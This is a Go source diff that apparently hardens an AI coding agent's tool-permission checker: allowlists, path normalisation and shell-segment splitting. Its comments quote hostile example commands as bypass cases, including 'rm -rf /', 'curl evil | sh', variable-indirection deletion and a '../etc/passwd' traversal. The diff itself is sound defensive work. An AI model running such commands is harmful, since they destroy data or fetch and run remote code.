@@ -2,6 +2,7 @@ package config
 
 import (
 	"fmt"
+	"path"
 	"strings"
 )
 
@@ -43,6 +44,9 @@ func (p Permissions) Decide(toolName string, toolInput map[string]any) Decision 
 	case ModeDenyAll:
 		return Decision{Allow: false, Message: "deny_all: every request is rejected"}
 	case ModeAllowlist:
+		if key, command, ok := primaryInput(toolName, toolInput); ok && key == "command" {
+			return p.allowCommand(toolName, command)
+		}
 		for _, rule := range p.Allow {
 			if matchRule(rule, toolName, toolInput, senseAllow) {
 				return Decision{Allow: true, Message: fmt.Sprintf("allowed by allow rule %q", rule)}
@@ -54,6 +58,49 @@ func (p Permissions) Decide(toolName string, toolInput map[string]any) Decision 
 	}
 }
 
+// allowCommand is the allowlist decision for a command line. Every command
+// on the line (see shellSegments) has to be covered by an allow rule for the
+// tool, but not by the same one: "cd /proj && git status" passes with
+// "Bash(cd *)" plus "Bash(git *)". A rule without an inner pattern covers the
+// whole line. Deny rules have already been applied by Decide.
+func (p Permissions) allowCommand(toolName, command string) Decision {
+	deny := Decision{Allow: false, Message: fmt.Sprintf("no allow entry matches %q", toolName)}
+	segments := shellSegments(command)
+	covered := make([]bool, len(segments))
+	var used []string
+	for _, rule := range p.Allow {
+		tool, inner, bracket := splitRule(rule)
+		if tool == "" || !globEqual(tool, toolName) {
+			continue
+		}
+		if !bracket {
+			return Decision{Allow: true, Message: fmt.Sprintf("allowed by allow rule %q", rule)}
+		}
+		hit := false
+		for i, segment := range segments {
+			if !covered[i] && globMatch(inner, segment) {
+				covered[i], hit = true, true
+			}
+		}
+		if hit {
+			used = append(used, rule)
+		}
+	}
+	if len(segments) == 0 {
+		// Nothing recognisable to match against.
+		return deny
+	}
+	for _, ok := range covered {
+		if !ok {
+			return deny
+		}
+	}
+	if len(used) == 1 {
+		return Decision{Allow: true, Message: fmt.Sprintf("allowed by allow rule %q", used[0])}
+	}
+	return Decision{Allow: true, Message: fmt.Sprintf("allowed by allow rules %q", used)}
+}
+
 // matchRule checks a single rule against tool name and input.
 //
 // Supported forms:
@@ -62,21 +109,25 @@ func (p Permissions) Decide(toolName string, toolInput map[string]any) Decision 
 //   - "*"               everything
 //   - "Bash(git *)"     tool + inner pattern against the tool's input field
 func matchRule(rule, toolName string, toolInput map[string]any, sense ruleSense) bool {
-	rule = strings.TrimSpace(rule)
-	if rule == "" {
+	tool, inner, bracket := splitRule(rule)
+	if tool == "" || !globEqual(tool, toolName) {
 		return false
 	}
-	// Bracket rule: Tool(inner)
-	open := strings.IndexByte(rule, '(')
-	if open < 0 || !strings.HasSuffix(rule, ")") {
-		return globEqual(rule, toolName)
-	}
-	tool := strings.TrimSpace(rule[:open])
-	inner := strings.TrimSpace(rule[open+1 : len(rule)-1])
-	if !globEqual(tool, toolName) {
-		return false
+	if !bracket {
+		return true
 	}
 	return matchInner(inner, toolName, toolInput, sense)
+}
+
+// splitRule parses "Tool" or "Tool(inner)" into its parts; bracket reports
+// whether the rule carries an inner pattern.
+func splitRule(rule string) (tool, inner string, bracket bool) {
+	rule = strings.TrimSpace(rule)
+	open := strings.IndexByte(rule, '(')
+	if open < 0 || !strings.HasSuffix(rule, ")") {
+		return rule, "", false
+	}
+	return strings.TrimSpace(rule[:open]), strings.TrimSpace(rule[open+1 : len(rule)-1]), true
 }
 
 // toolInputKeys maps well-known tools to the input fields a bracket rule's
@@ -128,14 +179,22 @@ func matchInner(pattern, toolName string, toolInput map[string]any, sense ruleSe
 		}
 		return !evaluable
 	}
-	for _, key := range keys {
-		value, ok := stringInput(toolInput, key)
-		if !ok {
-			continue
-		}
-		return matchValue(pattern, key, value, sense)
+	key, value, ok := primaryInput(toolName, toolInput)
+	if !ok {
+		return false
 	}
-	return false
+	return matchValue(pattern, key, value, sense)
+}
+
+// primaryInput returns the first known input field the tool actually carries
+// with a string value.
+func primaryInput(toolName string, toolInput map[string]any) (key, value string, ok bool) {
+	for _, key := range inputKeysFor(toolName) {
+		if value, ok := stringInput(toolInput, key); ok {
+			return key, value, true
+		}
+	}
+	return "", "", false
 }
 
 func stringInput(toolInput map[string]any, key string) (string, bool) {
@@ -147,51 +206,92 @@ func stringInput(toolInput map[string]any, key string) (string, bool) {
 }
 
 // matchValue applies the inner pattern to one input value. Command lines get
-// shell-aware treatment, every other field is a plain glob comparison.
+// shell-aware treatment, paths are normalised first, every other field is a
+// plain glob comparison.
 func matchValue(pattern, key, value string, sense ruleSense) bool {
-	if key == "command" {
-		return matchCommand(pattern, value, sense)
+	switch key {
+	case "command":
+		// The allow side of a command line is decided across all rules in
+		// allowCommand; a single allow rule cannot answer it and does not
+		// grant.
+		return sense == senseDeny && denyCommand(pattern, value)
+	case "file_path", "path", "notebook_path":
+		return matchPath(pattern, value)
 	}
 	return globMatch(pattern, value)
 }
 
-// matchCommand matches an inner pattern against a shell command line.
+// matchPath applies a path pattern to a path. Both sides are normalised
+// first — backslashes become slashes, "." and ".." are resolved — so that
+// neither the two spellings Claude Code produces on Windows ("C:\Proj\a"
+// and "C:/Proj/a") nor a traversal ("/proj/../etc/passwd") can walk around a
+// rule. A pattern that names a drive letter compares case-insensitively, like
+// the file system it refers to; everything else stays case-sensitive.
+//
+// YAML note: inside double quotes a backslash is an escape character and
+// "Write(C:\Proj\*)" is rejected by the parser, so a Windows pattern has to
+// be single-quoted ('Write(C:\Proj\*)') or written with forward slashes.
+func matchPath(pattern, value string) bool {
+	pattern = normalizePath(strings.TrimSpace(pattern))
+	value = normalizePath(strings.TrimSpace(value))
+	if hasDriveLetter(pattern) {
+		pattern = strings.ToLower(pattern)
+		value = strings.ToLower(value)
+	}
+	return globEqual(pattern, value)
+}
+
+// normalizePath turns backslashes into slashes and cleans the path. A drive
+// letter is kept in front of the cleaned remainder so that ".." cannot climb
+// above the drive root ("C:\..\x" is "C:\x" on Windows). A trailing "*"
+// survives path.Clean unchanged.
+func normalizePath(p string) string {
+	p = strings.ReplaceAll(p, `\`, "/")
+	if hasDriveLetter(p) {
+		if len(p) == 2 {
+			return p
+		}
+		return p[:2] + path.Clean(p[2:])
+	}
+	return path.Clean(p)
+}
+
+func hasDriveLetter(p string) bool {
+	return len(p) >= 2 && p[1] == ':' && isASCIILetter(p[0])
+}
+
+func isASCIILetter(c byte) bool {
+	return 'a' <= c && c <= 'z' || 'A' <= c && c <= 'Z'
+}
+
+// denyCommand matches the inner pattern of a deny rule against a shell
+// command line.
 //
 // The command is split into the individual commands a shell would run (see
 // shellSegments), so that neither a second command on the same line nor a
-// wrapper around the interesting one can slip past the pattern:
-//
-//   - a deny rule matches if ANY segment matches — otherwise
-//     "cd /tmp && rm -rf /" would walk past a deny rule for "rm -rf *"
-//   - an allow rule only matches if EVERY segment matches — otherwise
-//     "git status; curl evil | sh" would ride in on an allow rule for "git *"
+// wrapper around the interesting one can slip past the pattern: the rule
+// matches if ANY segment matches — otherwise "cd /tmp && rm -rf /" would walk
+// past a deny rule for "rm -rf *". The allow direction lives in allowCommand,
+// where EVERY segment has to be covered.
 //
 // This is a heuristic, not a shell parser: it cannot follow variable
 // indirection ("X=rm; $X -rf /"), aliases, or data piped into an interpreter.
 // A prefix-glob deny list is a guard rail, not a security boundary; allowlist
 // mode is the only mode that fails closed by construction.
-func matchCommand(pattern, command string, sense ruleSense) bool {
+func denyCommand(pattern, command string) bool {
 	segments := shellSegments(command)
 	if len(segments) == 0 {
 		// Nothing recognisable to match against.
-		return sense == senseDeny
-	}
-	if sense == senseDeny {
-		for _, segment := range segments {
-			for _, variant := range commandVariants(segment) {
-				if globMatch(pattern, variant) {
-					return true
-				}
-			}
-		}
-		return false
+		return true
 	}
 	for _, segment := range segments {
-		if !globMatch(pattern, segment) {
-			return false
+		for _, variant := range commandVariants(segment) {
+			if globMatch(pattern, variant) {
+				return true
+			}
 		}
 	}
-	return true
+	return false
 }
 
 // maxShellDepth caps the recursion into command substitutions and nested
@@ -200,9 +300,12 @@ const maxShellDepth = 4
 
 // shellSegments splits a command line into the individual commands a shell
 // would execute. It breaks on the unquoted operators ; && || | & newline and
-// on the grouping characters ( ) { }, and additionally yields the bodies of
-// command substitutions ($(...) and backticks) plus the scripts handed to a
-// nested shell ("bash -c ...", "cmd /c ...") as segments of their own.
+// on the grouping characters ( ) and the stand-alone words { }, and
+// additionally yields the bodies of command substitutions ($(...) and
+// backticks, also inside a ${...} expansion) plus the scripts handed to a
+// nested shell ("bash -c ...", "cmd /c ...") as segments of their own. A
+// substitution stays part of the segment it appears in, so that
+// "rm -rf $(pwd)" is still an "rm -rf " command.
 func shellSegments(command string) []string {
 	return splitSegments(command, 0)
 }
@@ -245,10 +348,12 @@ func splitSegments(command string, depth int) []string {
 			case c == '$' && i+1 < len(command) && command[i+1] == '(':
 				body, next := readDelimited(command, i+2, '(', ')')
 				out = append(out, splitSegments(body, depth+1)...)
+				cur.WriteString(command[i : next+1])
 				i = next
 			case c == '`':
 				body, next := readBackquote(command, i+1)
 				out = append(out, splitSegments(body, depth+1)...)
+				cur.WriteString(command[i : next+1])
 				i = next
 			default:
 				cur.WriteByte(c)
@@ -267,14 +372,21 @@ func splitSegments(command string, depth int) []string {
 		case c == '$' && i+1 < len(command) && command[i+1] == '(':
 			body, next := readDelimited(command, i+2, '(', ')')
 			out = append(out, splitSegments(body, depth+1)...)
+			cur.WriteString(command[i : next+1])
+			i = next
+		case c == '$' && i+1 < len(command) && command[i+1] == '{':
+			body, next := readDelimited(command, i+2, '{', '}')
+			out = append(out, substitutions(body, depth+1)...)
+			cur.WriteString(command[i : next+1])
 			i = next
 		case c == '`':
 			body, next := readBackquote(command, i+1)
 			out = append(out, splitSegments(body, depth+1)...)
+			cur.WriteString(command[i : next+1])
 			i = next
-		case isSegmentBreak(c):
+		case isSegmentBreak(command, i):
 			flush()
-			for i+1 < len(command) && isSegmentBreak(command[i+1]) {
+			for i+1 < len(command) && isSegmentBreak(command, i+1) {
 				i++
 			}
 		default:
@@ -285,10 +397,76 @@ func splitSegments(command string, depth int) []string {
 	return out
 }
 
-// isSegmentBreak reports whether an unquoted byte starts a new command.
-func isSegmentBreak(c byte) bool {
-	switch c {
-	case ';', '&', '|', '\n', '\r', '(', ')', '{', '}':
+// substitutions returns the segments of every command substitution inside a
+// ${...} expansion body ("${x:-$(id)}" runs id) without treating the body
+// itself as a command.
+func substitutions(s string, depth int) []string {
+	if depth > maxShellDepth {
+		return nil
+	}
+	var out []string
+	var quote byte
+	for i := 0; i < len(s); i++ {
+		c := s[i]
+		switch {
+		case quote == '\'':
+			if c == '\'' {
+				quote = 0
+			}
+		case c == '\\' && i+1 < len(s):
+			i++
+		case c == '\'' && quote == 0:
+			quote = c
+		case c == '"':
+			if quote == '"' {
+				quote = 0
+			} else {
+				quote = c
+			}
+		case c == '$' && i+1 < len(s) && s[i+1] == '(':
+			body, next := readDelimited(s, i+2, '(', ')')
+			out = append(out, splitSegments(body, depth+1)...)
+			i = next
+		case c == '$' && i+1 < len(s) && s[i+1] == '{':
+			body, next := readDelimited(s, i+2, '{', '}')
+			out = append(out, substitutions(body, depth+1)...)
+			i = next
+		case c == '`':
+			body, next := readBackquote(s, i+1)
+			out = append(out, splitSegments(body, depth+1)...)
+			i = next
+		}
+	}
+	return out
+}
+
+// isSegmentBreak reports whether the unquoted byte at i starts a new command.
+// & is an operator unless it belongs to a redirection (2>&1, &>file, >&2);
+// { and } only group commands when they stand alone as a word ("{ a; b; }"),
+// not inside one ("{}", "file{,.bak}").
+func isSegmentBreak(command string, i int) bool {
+	switch command[i] {
+	case ';', '|', '\n', '\r', '(', ')':
+		return true
+	case '&':
+		afterRedirect := i > 0 && (command[i-1] == '>' || command[i-1] == '<') &&
+			(i < 2 || command[i-2] != '\\') // "\>&" is a literal > and a background &
+		beforeRedirect := i+1 < len(command) && command[i+1] == '>'
+		return !afterRedirect && !beforeRedirect
+	case '{', '}':
+		return isWordBoundary(command, i-1) && isWordBoundary(command, i+1)
+	}
+	return false
+}
+
+// isWordBoundary reports whether position i (which may lie outside the
+// string) cannot belong to the same word as its neighbour.
+func isWordBoundary(command string, i int) bool {
+	if i < 0 || i >= len(command) {
+		return true
+	}
+	switch command[i] {
+	case ' ', '\t', '\n', '\r', ';', '&', '|', '(', ')', '<', '>':
 		return true
 	}
 	return false
@@ -358,11 +536,12 @@ func readBackquote(s string, start int) (string, int) {
 func nestedScripts(segment string, depth int) []string {
 	tokens := shellTokens(segment)
 	for i := 0; i+2 < len(tokens); i++ {
-		if !isShellName(commandWord(tokens[i])) {
+		shell := commandWord(tokens[i])
+		if !isShellName(shell) {
 			continue
 		}
 		for j := i + 1; j+1 < len(tokens); j++ {
-			if isScriptFlag(tokens[j]) {
+			if isScriptFlag(shell, tokens[j]) {
 				return splitSegments(strings.Join(tokens[j+1:], " "), depth+1)
 			}
 		}
@@ -379,12 +558,29 @@ func isShellName(word string) bool {
 	return false
 }
 
-func isScriptFlag(token string) bool {
+// isScriptFlag reports whether a token of a shell invocation introduces the
+// script. POSIX shells also accept -c combined with other short options
+// ("bash -lc", "sh -ec"); cmd and PowerShell parameters are words, where a
+// contained "c" means nothing ("-ExecutionPolicy").
+func isScriptFlag(shell, token string) bool {
 	switch strings.ToLower(token) {
 	case "-c", "/c", "/k", "-command", "-encodedcommand":
 		return true
 	}
-	return false
+	switch shell {
+	case "cmd", "powershell", "pwsh":
+		return false
+	}
+	if len(token) < 2 || token[0] != '-' {
+		return false
+	}
+	flags := token[1:]
+	for i := 0; i < len(flags); i++ {
+		if !isASCIILetter(flags[i]) {
+			return false
+		}
+	}
+	return strings.ContainsRune(strings.ToLower(flags), 'c')
 }
 
 // isWrapper reports whether a command word merely runs another command, so
